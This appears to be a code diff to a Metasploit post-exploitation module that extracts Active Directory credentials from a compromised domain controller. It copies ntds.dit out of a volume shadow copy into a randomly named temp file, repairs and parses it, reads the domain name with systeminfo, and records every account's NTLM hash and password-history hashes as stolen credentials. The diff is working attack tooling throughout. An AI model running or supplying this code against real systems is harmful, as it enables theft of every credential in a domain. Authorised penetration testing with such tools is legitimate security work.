@@ -36,9 +36,16 @@ class Metasploit3 < Msf::Post
       unless ntds_file.nil?
         print_status "Repairing NTDS database after copy..."
         print_status repair_ntds(ntds_file)
+        realm = domain_name
         ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
         ntds_parser.each_account do |ad_account|
           print_good ad_account.to_s
+          report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)
+          ad_account.nt_history.each_with_index do |nt_hash, index|
+            hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH
+            hash_string << ":#{nt_hash}"
+            report_hash(hash_string.downcase,ad_account.name, realm)
+          end
         end
       end
     end
@@ -57,6 +64,11 @@ class Metasploit3 < Msf::Post
       end
     end
     database_file_path
+  end
+
+  def domain_name
+    result = cmd_exec('cmd.exe', '/c systeminfo | findstr /B /C:"Domain"')
+    result.gsub!(/Domain:\s+/,'')
   end
 
   def is_domain_controller?
@@ -108,6 +120,21 @@ class Metasploit3 < Msf::Post
     cmd_exec("esentutl", arguments)
   end
 
+  def report_hash(ntlm_hash, username, realm)
+    cred_details = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: self.refname,
+      private_type: :ntlm_hash,
+      private_data: ntlm_hash,
+      username: username,
+      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+      realm_value: realm,
+      workspace_id: myworkspace_id
+    }
+    create_credential(cred_details)
+  end
+
   def session_compat?
     if sysinfo['Architecture'] =~ /x64/ && session.platform =~ /x86/
       print_error "You are running 32-bit Meterpreter on a 64 bit system"
@@ -120,16 +147,13 @@ class Metasploit3 < Msf::Post
 
   def vss_method
     id = create_shadowcopy("#{expand_path("%SystemDrive%")}\\")
+    print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
     sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
     target_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
-    copy_command = "/c copy #{sc_path} #{target_path}"
-    result = cmd_exec('cmd.exe', copy_command)
-    if result =~ /1 file\(s\) copied/
-      return target_path
-    else
-      return nil
-    end
+    print_status "Moving ntds.dit to #{target_path}"
+    client.fs.file.mv(sc_path, target_path)
+    target_path
   end
 
 end
